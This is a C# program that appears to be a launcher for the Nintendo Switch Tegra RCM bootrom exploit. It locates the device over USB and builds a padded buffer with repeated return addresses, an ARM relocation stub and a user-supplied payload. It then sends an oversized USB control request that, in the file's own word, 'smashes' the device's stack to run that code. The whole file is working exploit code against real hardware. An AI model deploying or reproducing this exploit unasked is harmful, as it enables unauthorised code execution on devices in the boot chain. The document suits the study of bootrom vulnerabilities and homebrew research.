using libusbK;
using System;
using System.IO;

namespace TegraSharp
{
    internal class Program
    {
        private static int _writes;

        private static readonly byte[] Intermezzo =
        {
            0x44, 0x00, 0x9F, 0xE5, // LDR   R0, [PC, #0x44]
            0x01, 0x11, 0xA0, 0xE3, // MOV   R1, #0x40000000
            0x40, 0x20, 0x9F, 0xE5, // LDR   R2, [PC, #0x40]
            0x00, 0x20, 0x42, 0xE0, // SUB   R2, R2, R0
            0x08, 0x00, 0x00, 0xEB, // BL    #0x28
            0x01, 0x01, 0xA0, 0xE3, // MOV   R0, #0x40000000
            0x10, 0xFF, 0x2F, 0xE1, // BX    R0
            0x00, 0x00, 0xA0, 0xE1, // MOV   R0, R0
            0x2C, 0x00, 0x9F, 0xE5, // LDR   R0, [PC, #0x2C]
            0x2C, 0x10, 0x9F, 0xE5, // LDR   R1, [PC, #0x2C]
            0x02, 0x28, 0xA0, 0xE3, // MOV   R2, #0x20000
            0x01, 0x00, 0x00, 0xEB, // BL    #0xC
            0x20, 0x00, 0x9F, 0xE5, // LDR   R0, [PC, #0x20]
            0x10, 0xFF, 0x2F, 0xE1, // BX    R0
            0x04, 0x30, 0x90, 0xE4, // LDR   R3, [R0], #4
            0x04, 0x30, 0x81, 0xE4, // STR	 R3, [R1], #4
            0x04, 0x20, 0x52, 0xE2, // SUBS	 R2, R2, #4
            0xFB, 0xFF, 0xFF, 0x1A, // BNE	 #0xFFFFFFF4
            0x1E, 0xFF, 0x2F, 0xE1, // BX	 LR
            0x20, 0xF0, 0x01, 0x40, // ANDMI PC, R1, R0, LSR #32
            0x5C, 0xF0, 0x01, 0x40, // ANDMI PC, R1, IP, ASR R0
            0x00, 0x00, 0x02, 0x40, // ANDMI R0, R2, R0
            0x00, 0x00, 0x01, 0x40  // ANDMI R0, R1, R0
        };

        private static UsbK FindDevice()
        {
            var patternMatch = new KLST_PATTERN_MATCH { DeviceID = @"USB\VID_0955&PID_7321" };
            var deviceList = new LstK(0, ref patternMatch);
            deviceList.MoveNext(out var deviceInfo);
            return new UsbK(deviceInfo);
        }

        private static void Write(UsbK wrt, byte[] payload)
        {
            var buffer = new byte[0x1000];

            for (var i = 0; i < payload.Length - 1; i += 0x1000, _writes++)
            {
                Buffer.BlockCopy(payload, i, buffer, 0, 0x1000);
                wrt.WritePipe(1, buffer, 0x1000, out _, IntPtr.Zero);
            }
        }

        private static byte[] SwizzlePayload(byte[] payload)
        {
            var buf = new byte[(int)Math.Ceiling((66216m + payload.Length) / 0x1000) * 0x1000];
            using (var mem = new MemoryStream())
            using (var wrt = new BinaryWriter(mem))
            {
                wrt.Write(0x30298);
                mem.Position = 0x2a8;
                for (var i = 0; i < 0x3c00; i++)
                    wrt.Write(0x4001f000);
                mem.Position = 0xf2a8;
                wrt.Write(Intermezzo);
                mem.Position = 0x102a8;
                wrt.Write(payload);
                Array.Copy(mem.ToArray(), buf, mem.Length);
                return buf;
            }
        }

        private static void Main(string[] args)
        {
            var buf = new byte[0x10];

            UsbK Switch;

            try
            {
                Switch = FindDevice();
                Switch.SetAltInterface(0, false, 0);
            }
            catch
            {
                Console.Error.WriteLine("Error: Cannot access device, is your Switch plugged in, turned on and in RCM mode?");
                return;
            }

            Switch.ReadPipe(0x81, buf, 0x10, out _, IntPtr.Zero);
            Console.WriteLine("Device ID: {0}", BitConverter.ToString(buf).Replace("-", "").ToLower());

            Console.WriteLine("Writing payload...");
            Write(Switch, SwizzlePayload(File.ReadAllBytes(args[0])));

            if (_writes % 2 != 1)
            {
                Console.WriteLine("Switching buffers...");
                Switch.WritePipe(1, new byte[0x1000], 0x1000, out _, IntPtr.Zero);
            }

            Console.WriteLine("Smashing...");
            var setup = new WINUSB_SETUP_PACKET
            {
                RequestType = 0x81,
                Request = 0,
                Value = 0,
                Index = 0,
                Length = 0x7000
            };

            var result = Switch.ControlTransfer(setup, new byte[0x7000], 0x7000, out var b, IntPtr.Zero);

            Console.WriteLine(!result
                ? "Successfully smashed device!"
                : $"Length transferred was 0x{b:x} bytes... it seems your Switch isn't vulnerable.");
        }
    }
}